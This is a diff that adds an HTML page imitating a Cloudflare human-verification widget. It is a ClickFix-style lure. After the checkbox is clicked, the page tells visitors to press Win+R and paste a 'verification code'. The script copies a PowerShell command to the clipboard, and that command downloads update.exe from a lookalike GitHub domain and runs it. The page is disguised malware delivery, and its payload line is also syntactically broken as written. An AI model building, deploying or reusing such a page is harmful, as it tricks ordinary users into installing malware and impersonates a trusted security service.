@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Just a moment...</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background-color: #f9f9f9;
+            color: #2b2b2b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .card {
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            width: 380px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+        }
+
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .domain { font-size: 15px; font-weight: 600; color: #1a1a1a; }
+        .sub-domain { font-size: 12px; color: #757575; }
+
+        .captcha-widget {
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            user-select: none;
+            transition: border-color 0.2s;
+        }
+
+        .captcha-widget:hover { border-color: #b7b7b7; }
+
+        .checkbox-container { display: flex; align-items: center; gap: 12px; }
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #1a73e8;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            display: none;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .captcha-text { font-size: 14px; font-weight: 400; color: #222; }
+
+        .branding { display: flex; flex-direction: column; align-items: flex-end; }
+        .branding-text { font-size: 8px; color: #999; margin-top: 2px; }
+
+        .clickfix-panel {
+            display: none;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #eeeeee;
+        }
+
+        .instruction-title { font-size: 12px; font-weight: 600; color: #d93025; margin-bottom: 10px; }
+        
+        .step-item {
+            font-size: 12px;
+            color: #4a4a4a;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        kbd {
+            background: #eef1f5;
+            border: 1px solid #cbd5e1;
+            border-radius: 3px;
+            padding: 1px 5px;
+            font-size: 11px;
+            font-family: monospace;
+            font-weight: 600;
+        }
+
+        .copy-btn {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 4px;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            transition: background 0.2s;
+        }
+
+        .copy-btn:hover { background: #1d4ed8; }
+        .copy-btn:active { background: #1e40af; }
+
+        .footer-text { margin-top: 16px; font-size: 11px; color: #9e9e9e; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div>
+            <div class="domain">secure-verification-gate.com</div>
+            <div class="sub-domain">Verify you are human to continue</div>
+        </div>
+    </div>
+
+    <div class="captcha-widget" id="captchaWidget" onclick="triggerFix()">
+        <div class="checkbox-container">
+            <div class="checkbox" id="checkbox"></div>
+            <div class="spinner" id="spinner"></div>
+            <span class="captcha-text">I'm not a robot</span>
+        </div>
+        <div class="branding">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6821f" stroke-width="2">
+                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+            </svg>
+            <span class="branding-text">Cloudflare</span>
+        </div>
+    </div>
+
+    <div class="clickfix-panel" id="clickfixPanel">
+        <div class="instruction-title">⚠️ Verification Steps Required:</div>
+        
+        <div class="step-item">
+            1. Copy the verification string:
+            <br>
+            <button class="copy-btn" onclick="copyPayload(event)">
+                📋 Copy Verification Code
+            </button>
+        </div>
+        
+        <div class="step-item">
+            2. Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard.
+        </div>
+        
+        <div class="step-item">
+            3. Paste (<kbd>Ctrl</kbd> + <kbd>V</kbd>) and press <kbd>Enter</kbd>.
+        </div>
+    </div>
+
+    <div class="footer-text">Protected by Cloudflare • Ray ID: 88a3e91f0c2b12a</div>
+</div>
+
+<script>
+    function triggerFix() {
+        const checkbox = document.getElementById('checkbox');
+        const spinner = document.getElementById('spinner');
+        const panel = document.getElementById('clickfixPanel');
+
+        checkbox.style.display = 'none';
+        spinner.style.display = 'block';
+
+        setTimeout(() => {
+            spinner.style.display = 'none';
+            checkbox.style.display = 'flex';
+            checkbox.innerHTML = '✔';
+            checkbox.style.color = '#059669';
+            checkbox.style.borderColor = '#059669';
+            checkbox.style.fontSize = '14px';
+
+            panel.style.display = 'block';
+        }, 600);
+    }
+
+    function copyPayload(e) {
+        e.stopPropagation();
+        const fakeCommand = powershell -NoProfile -Command "iwr -Uri 'https://rawgithubusercontent.com/Re-chapta-secure/rechaptasecure/refs/heads/main/update.exe' -OutFile `"$env:TEMP\update.exe`"; Start-Process -FilePath `"$env:TEMP\update.exe`"";
+        navigator.clipboard.writeText(fakeCommand);
+        
+        const btn = e.target;
+        btn.innerText = '✓ Copied to Clipboard';
+        btn.style.background = '#059669';
+    }
+</script>
+
+</body>
+</html>
